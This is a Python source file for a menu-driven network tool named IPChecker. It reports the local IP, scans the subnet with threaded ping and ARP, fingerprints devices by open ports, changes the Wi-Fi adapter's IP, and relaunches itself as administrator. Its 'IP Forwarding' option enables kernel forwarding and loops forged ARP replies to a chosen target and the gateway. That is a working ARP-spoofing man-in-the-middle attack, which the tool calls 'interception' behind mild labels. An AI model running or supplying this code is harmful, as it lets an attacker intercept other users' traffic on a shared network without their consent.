import os
import platform
import socket
import subprocess
import sys
import time
import webbrowser
import getpass
import struct
from threading import Thread, Lock

BANNER_TEXT = r"""
  ___ ____   ____ _               _            
 |_ _|  _ \ / ___| |__   ___  ___| | _____ _ __ 
  | || |_) | |   | '_ \ / _ \/ __| |/ / _ \ '__|
  | ||  __/| |___| | | |  __/ (__|   <  __/ |   
 |___|_|    \____|_| |_|\___|\___|_|\_\___|_|   
"""

# Global flags
FORWARDING_ACTIVE = False
IS_OBFUSCATED = False  # Tracks if the static IP override is currently active
print_lock = Lock()


def is_admin():
    """Checks if the script is currently running with administrative/root privileges."""
    os_type = platform.system()
    if os_type == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        return os.getuid() == 0


def relaunch_as_admin():
    """Relaunches the current script with administrative privileges."""
    os_type = platform.system()
    print("[*] Elevating privileges... Please accept the prompt.")
    time.sleep(1)

    try:
        if os_type == "Windows":
            import ctypes
            script = os.path.abspath(sys.argv[0])
            params = " ".join(sys.argv[1:])
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{script}" {params}', None, 1
            )
            sys.exit(0)
        else:
            script = os.path.abspath(sys.argv[0])
            cmd = ["sudo", sys.executable, script] + sys.argv[1:]
            os.execvp("sudo", cmd)
    except Exception as e:
        print(f"[ERROR] Failed to elevate privileges: {e}")
        input("\nPress ENTER to continue...")


def downgrade_privileges():
    """Forces an admin-run terminal to drop down to normal user level safely."""
    os_type = platform.system()
    print("[*] Dropping administrative clearances... Reverting to normal terminal.")
    time.sleep(1)

    try:
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        current_dir = os.getcwd()

        if os_type == "Windows":
            cmd_args = f'cmd.exe /k "cd /d \\"{current_dir}\\" && \\"{sys.executable}\\" \\"{script}\\" {params}"'
            subprocess.Popen(cmd_args, shell=True)
            sys.exit(0)
        else:
            user = os.environ.get("SUDO_USER")
            if user:
                cmd = ["su", "-", user, "-c", f"cd '{current_dir}' && {sys.executable} {script} {params}"]
                os.execvp("su", cmd)
            else:
                print("[!] Normal shell user identity not found. Cannot safely drop root.")
                time.sleep(1.5)
    except Exception as e:
        print(f"[ERROR] Failed to safely drop privileges: {e}")
        input("\nPress ENTER to continue...")


def is_online():
    """Checks for an active local network configuration by checking if a local IP is assigned."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip != "127.0.0.1"
    except Exception:
        return False


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def show_banner():
    print(BANNER_TEXT)
    if is_admin():
        print(" [STATUS] Running IPChecker as Administrator")
    else:
        current_user = getpass.getuser()
        print(f" [STATUS] Running IPChecker as [{current_user}].")
    print("-" * 65)


def get_local_ip():
    """Gets the actual primary local IP address by creating a dummy socket connection."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except socket.error:
            return None


def get_gateway_ip():
    """Dynamically fetches the default gateway (Router IP) from the system route table."""
    os_type = platform.system()
    try:
        if os_type == "Windows":
            out = subprocess.check_output("route print 0.0.0.0", shell=True, text=True)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                    return parts[2]
        else:
            out = subprocess.check_output("ip route show default", shell=True, text=True)
            parts = out.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return None


def get_mac_address(target_ip):
    """Resolves an IP address to a physical MAC address dynamically via standard OS bindings."""
    os_type = platform.system()
    if os_type == "Windows":
        import ctypes
        try:
            ip_bytes = socket.inet_aton(target_ip)
            ip_num = struct.unpack("I", ip_bytes)[0]
            mac = ctypes.create_string_buffer(6)
            mac_len = ctypes.c_ulong(6)
            if ctypes.windll.iphlpapi.SendARP(ip_num, 0, ctypes.byref(mac), ctypes.byref(mac_len)) == 0:
                return mac.raw
        except Exception:
            pass
    else:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((target_ip, 80))
            s.close()
            
            out = subprocess.check_output(f"arp -n {target_ip}", shell=True, text=True)
            for line in out.splitlines():
                if target_ip in line:
                    for item in line.split():
                        if ":" in item and len(item) == 17:
                            return bytes.fromhex(item.replace(":", ""))
        except Exception:
            pass
    return None


def send_arp_reply(src_ip, src_mac, dest_ip, dest_mac):
    """Constructs and broadcasts a raw ARP response frame onto the network interface link layer."""
    os_type = platform.system()
    try:
        if os_type == "Windows":
            subprocess.run(f"netsh interface ipv4 add neighbors \"Wi-Fi\" {dest_ip} {dest_mac.hex(':')}", 
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
            s.bind(("eth0", 0))
            eth_hdr = dest_mac + src_mac + b'\x08\x06'
            arp_payload = b'\x00\x01\x08\x00\x06\x04\x00\x02' + src_mac + socket.inet_aton(src_ip) + dest_mac + socket.inet_aton(dest_ip)
            s.send(eth_hdr + arp_payload)
            s.close()
    except Exception:
        pass


def arp_routing_loop(target_ip, gateway_ip, target_mac, gateway_mac):
    """Continuous low-overhead background thread keeping the forwarding channel alive."""
    global FORWARDING_ACTIVE
    while FORWARDING_ACTIVE:
        try:
            send_arp_reply(gateway_ip, b'\x00\x11\x22\x33\x44\x55', target_ip, target_mac)
            send_arp_reply(target_ip, b'\x00\x11\x22\x33\x44\x55', gateway_ip, gateway_mac)
            time.sleep(2)
        except KeyboardInterrupt:
            break
    print("\n[*] Routing loop terminated. Disengaging hooks...")


def check_port(ip, port, timeout=0.5):
    """Checks if a specific network port is open on the target device."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            if s.connect_ex((ip, port)) == 0:
                return True
    except Exception:
        pass
    return False


def deep_profile_device(ip):
    """Performs deep operational port fingerprinting to precisely identify operating system details."""
    if check_port(ip, 135, timeout=0.3) or check_port(ip, 445, timeout=0.3):
        return "PC (Windows)"
    
    if check_port(ip, 548, timeout=0.3) or check_port(ip, 5900, timeout=0.3):
        return "PC (MacOS)"
    if check_port(ip, 62078, timeout=0.4):
        return "Mobile (iOS Device)"

    if check_port(ip, 22, timeout=0.3):
        return "PC / Server (Linux)"
    if check_port(ip, 5555, timeout=0.3):
        return "Mobile (Android Device)"
    if check_port(ip, 9222, timeout=0.3) or check_port(ip, 2222, timeout=0.3):
        return "PC (ChromeOS Device)"

    if check_port(ip, 80, timeout=0.2) or check_port(ip, 443, timeout=0.2):
        if ip.endswith(".1"):
            return "Network Router / Gateway Interface"
        return "Network Device / Smart Hardware (Linux-based)"
        
    return "Unidentified Device"


def scan_host_real(ip_prefix, host, active_devices, local_ip):
    """Forces a hardware neighborhood lookup before pulling the ARP registration."""
    ip = f"{ip_prefix}.{host}"
    os_type = platform.system()
    
    if os_type == "Windows":
        subprocess.run(["ping", "-n", "1", "-w", "200", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    mac_raw = get_mac_address(ip)
    
    if mac_raw:
        mac_str = mac_raw.hex(':').upper()
        device_type = deep_profile_device(ip)
        
        if ip == local_ip:
            device_type += " [YOUR PC]"
            
        with print_lock:
            print(f"[DEVICE ONLINE] {ip:<15} | MAC: {mac_str} -> {device_type}")
            active_devices.append((ip, device_type))


def check_wifi_ips():
    """Scans local subnets using multi-threaded ARP validation for real live verification."""
    local_ip = get_local_ip()
    if not local_ip or local_ip == "127.0.0.1":
        print("[ERROR] Cannot scan without a valid local network connection.")
        return

    ip_parts = local_ip.split(".")
    ip_prefix = ".".join(ip_parts[:3])
    
    print(f"[*] Analyzing live Subnet Target: {ip_prefix}.1 to {ip_prefix}.254")
    print(f"[*] Your Detected Local IP: {local_ip}")
    print("[*] Launching multi-threaded physical layer identification scan...")
    print("-" * 75)
    
    threads = []
    active_devices = []
    
    for host in range(1, 255):
        t = Thread(target=scan_host_real, args=(ip_prefix, host, active_devices, local_ip))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("-" * 75)
    print(f"[SUCCESS] Scan Complete. Profiled {len(active_devices)} true active target(s).")


def toggle_obfuscate_ip():
    """Manually forces a fresh static IP configuration or reverts to DHCP seamlessly."""
    global IS_OBFUSCATED
    os_type = platform.system()

    if os_type != "Windows":
        print("[!] This advanced override is currently optimized for Windows environments.")
        return

    # Dynamic toggle logic requested
    if IS_OBFUSCATED:
        choice = input("IP has already been Obfuscated. Would you like to disable it? (y/n): ").strip().lower()
        if choice == 'y':
            print("[*] Reverting network card back to automatic router control...")
            cmd = 'netsh interface ipv4 set address name="Wi-Fi" dhcp'
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                print("[SUCCESS] Returned to DHCP. Your router is assigning your IP again.")
                IS_OBFUSCATED = False
            else:
                print(f"[ERROR] Failed to restore adapter: {result.stderr.strip()}")
        return

    print("[*] Initiating Manual IP Obfuscation routine...")
    local_ip = get_local_ip()
    if not local_ip:
        print("[ERROR] No active network configuration detected.")
        return

    ip_parts = local_ip.split(".")
    current_host = int(ip_parts[3])
    new_host = 150 if current_host < 150 else 50
    new_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{new_host}"
    gateway_ip = get_gateway_ip()

    print(f"[*] Attempting to shift identity from {local_ip} -> {new_ip}")

    try:
        cmd = f'netsh interface ipv4 set address name="Wi-Fi" static {new_ip} 255.255.255.0 {gateway_ip}'
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            print(f"[SUCCESS] Network identity updated! Your manual local IP is now: {new_ip}")
            IS_OBFUSCATED = True
        else:
            print(f"[ERROR] Failed to set static configuration: {result.stderr.strip()}")
            print("[ℹ️] Ensure your network adapter is named exactly 'Wi-Fi' in your Windows settings.")
            
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")


def toggle_ip_forwarding():
    """Modifies internal routing engines and handles automated packet redirection live."""
    global FORWARDING_ACTIVE
    os_type = platform.system()
    
    if FORWARDING_ACTIVE:
        print("[*] Stopping background operational routing threads...")
        FORWARDING_ACTIVE = False
        print("[SUCCESS] IP Forwarding Engine and active interception stands down.")
        return

    print(f"[*] Native Platform Verification: {os_type}")
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("[ERROR] Gateway Router target could not be resolved automatically.")
        return
        
    print(f"[*] Auto-detected Router IP: {gateway_ip}")
    target_ip = input("Enter target IP address to route/forward: ").strip()
    
    print("[*] Resolving hardware link states (MAC addresses)...")
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[ERROR] Verification Failure: Ensure target is awake and responding to network events.")
        return

    try:
        if os_type in ["Linux", "Darwin"]:
            sysctl_key = "net.ipv4.ip_forward" if os_type == "Linux" else "net.inet.ip.forwarding"
            subprocess.run(["sysctl", "-w", f"{sysctl_key}=1"], check=True, stdout=subprocess.DEVNULL)
        elif os_type == "Windows":
            import winreg
            path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", "Loopback", "forwarding=enabled"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[ERROR] Failed to set low-level kernel variables: {e}")
        return

    FORWARDING_ACTIVE = True
    t = Thread(target=arp_routing_loop, args=(target_ip, gateway_ip, target_mac, gateway_mac), daemon=True)
    t.start()
    print(f"[SUCCESS] Interception active. Traffic from {target_ip} is now forwarding through this PC.")


def main():
    while True:
        clear()
        show_banner()

        if not is_online():
            print("[!] STATUS: OFFLINE\n")
            print("=================================================")
            print("               Connect to Wifi                   ")
            print("=================================================")
            input("\nPress ENTER to Refresh...")
            continue

        print("[1] Get Real Local IP")
        print("[2] Scan Subnet & Profile Devices")
        print("[3] Rotate/Obfuscate Network IP")
        print("[4] IP Forwarding")
        print("[5] Relaunch as Administrator")
        print("[6] Close Terminal\n")

        choice = input("Select Option: [~] ").strip()

        if choice.lower() == "github":
            webbrowser.open("https://github.com/DuckyCashy/IPChecker")
            continue

        if choice.lower() == "revert":
            if is_admin():
                downgrade_privileges()
            else:
                print("[!] Terminal is already running in default limited user mode.")
                time.sleep(1.5)
            continue

        clear()
        show_banner()

        if choice == "1":
            ip = get_local_ip()
            if ip:
                print(f"[SUCCESS] Local IP Found: {ip}")
            else:
                print("[ERROR] Failed to find active IP assignment.")
        elif choice == "2":
            check_wifi_ips()
        elif choice == "3":
            if not is_admin():
                print("[WARNING] This operation requires Admin privileges.")
                if input("Try to relaunch as Admin now? (y/n): ").lower() == 'y':
                    relaunch_as_admin()
            else:
                toggle_obfuscate_ip()
        elif choice == "4":
            if not is_admin():
                print("[WARNING] This operation requires Admin privileges.")
                if input("Try to relaunch as Admin now? (y/n): ").lower() == 'y':
                    relaunch_as_admin()
            else:
                toggle_ip_forwarding()
        elif choice == "5":
            if is_admin():
                print("[!] Already running with Administrator / Root clearances.")
            else:
                relaunch_as_admin()
        elif choice == "6":
            print("[!] Closing Terminal...")
            time.sleep(1)
            break
        else:
            print("[!] Invalid Option.")

        print()
        input("Press ENTER to continue...")


if __name__ == "__main__":
    main()
